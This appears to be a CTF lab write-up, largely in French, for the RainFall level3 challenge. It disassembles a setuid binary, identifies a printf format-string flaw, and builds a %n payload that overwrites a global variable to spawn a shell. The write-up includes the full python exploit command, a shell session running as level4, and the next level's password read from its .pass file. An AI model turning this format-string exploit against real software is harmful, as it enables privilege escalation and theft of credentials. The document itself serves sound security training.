@@ -1,0 +1,101 @@
+-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3*
+
+level3@RainFall:~$ ./level3 
+sad
+sad
+
+Prend un input et l'affiche
+
+0x080484a4 <+0>:     push   %ebp
+0x080484a5 <+1>:     mov    %esp,%ebp
+0x080484a7 <+3>:     sub    $0x218,%esp				-> StackFrame de 536
+0x080484ad <+9>:     mov    0x8049860,%eax			-> Save stdin dans eax
+0x080484b2 <+14>:    mov    %eax,0x8(%esp)			-> stdin à esp+8	=> arg de fgets | stdin
+0x080484b6 <+18>:    movl   $0x200,0x4(%esp)		-> 512 à esp+4		=> arg de fgets | 512
+0x080484be <+26>:    lea    -0x208(%ebp),%eax		-> Buffer de 520 | 16 de var local	| buf[520]
+0x080484c4 <+32>:    mov    %eax,(%esp)				-> Mise au top pour le call
+0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>	-> Overflow impossible | fgets(buffer, 512, stdin)
+0x080484cc <+40>:    lea    -0x208(%ebp),%eax		-> Save le ptr du buffer dans eax
+0x080484d2 <+46>:    mov    %eax,(%esp)				-> Place le buffer remplit avec l'input au top
+0x080484d5 <+49>:    call   0x8048390 <printf@plt>	-> Affiche l'input -> faille printf ? => 1 seul arg
+0x080484da <+54>:    mov    0x804988c,%eax			-> la valeur de m est save dans eax ? var non init
+0x080484df <+59>:    cmp    $0x40,%eax				-> il faut que m soit égale à 64
+0x080484e2 <+62>:    jne    0x8048518 <v+116>		-> Si non égale stop la fonction
+0x080484e4 <+64>:    mov    0x8049880,%eax			-> stdout dans eax
+0x080484e9 <+69>:    mov    %eax,%edx				-> stdout déplacé vers edx
+0x080484eb <+71>:    mov    $0x8048600,%eax			-> valeur dure dans eax			=> arg de fwrite -> "Wait what?!\n"
+0x080484f0 <+76>:    mov    %edx,0xc(%esp)			-> stdout dans esp+12			=> arg de fwrite -> stdout
+0x080484f4 <+80>:    movl   $0xc,0x8(%esp)			-> valeur dure 12 dans esp+8	=> arg de fwrite -> 12
+0x080484fc <+88>:    movl   $0x1,0x4(%esp)			-> valeur dure 1 dans esp+4		=> arg de fwrite -> 1
+0x08048504 <+96>:    mov    %eax,(%esp)				-> préparation avant le call 
+0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>	-> Affiche quelque chose -> fwrite("Wait what?!\n", 1, 12, stdout)
+0x0804850c <+104>:   movl   $0x804860d,(%esp)		-> "/bin/sh"
+0x08048513 <+111>:   call   0x80483c0 <system@plt>	-> Shell
+0x08048518 <+116>:   leave
+0x08048519 <+117>:   ret
+
+>>> info variables
+0x0804988c  m
+>>> x/s 0x0804988c
+0x804988c <m>:  ""
+Variable globale m
+
+
+Il est claire qu'il faille donner une valeur à la var globale 'm' avant de pouvoir exploit
+
+Second point important, même si fgets est mtn protégé, il y a une faille sur printf sur un appel avec 1 arg
+
+Code such as printf(foo); often indicates a bug, since foo may contain a % character.
+If foo comes from untrusted user input, it may contain %n, 
+causing the printf() call to write to memory and creating a security hole. 
+
+%n => écrit dans l'arg le nombre de caracts affichés
+Il attend un arg qui est un ptr vers un entier (int*)
+
+level3@RainFall:~$ ./level3 
+salut%n
+Segmentation fault (core dumped)
+
+-> %x est souvent utilisé avec %n pour consommer des valeurs de la pile et avancer jusqu'à atteindre une addr
+-> %100x pour controler précisément la valeur écrite
+=> buf[520] est donné en arg à printf
+
+Objectif:
+-> Donner l'addr de 'm' dans l'input => printf va l'interpreté comme arg pour l'écriture
+-> Trouver l'addr du buffer dans printf => pour savoir où mettre le 64 pour qu'il soit écrit
+
+%x-AAAAAAAAAAAAAAAAAAAAAAA
+200-AAAAAAAAAAAAAAAAAAAAAAA
+La taille du buffer en hexa 0x200 ? 1er valeur d'addr
+
+AAAA-%x-%x-%x-%x-%x-%x-%x
+AAAA-200-f7fab5c0-40-41414141-2d78252d-252d7825-78252d78
+
+=> l'input est écrit 4 addr plus loin
+
+little-endian -> 0x0804988c | \x8C\x98\x04\x08
+
+printf("64", 0x0804988c)
+
+41414141 => le 64 doit etre ici
+
+On ne peut pas écrire 64 directement; printf utilise un compteur interne au moment de %n
+
+l'addr de 'm' prend 4 bytes donc il ne faut écrire que 60 => %60x => affiche %x sur 60 caracts
+
+python -c 'print "\x8C\x98\x04\x08"+"%60x"+"%4$n"'
+
+level3@RainFall:~$ python -c 'print "\x8C\x98\x04\x08"+"%60x"+"%4$n"' | ./level3 
+�                                                         200
+Wait what?!
+
+Il faut bloquer le shell
+
+level3@RainFall:~$ python -c 'print "\x8C\x98\x04\x08"+"%60x"+"%4$n"' > /tmp/sad
+level3@RainFall:~$ cat /tmp/sad - | ./level3 
+�                                                         200
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
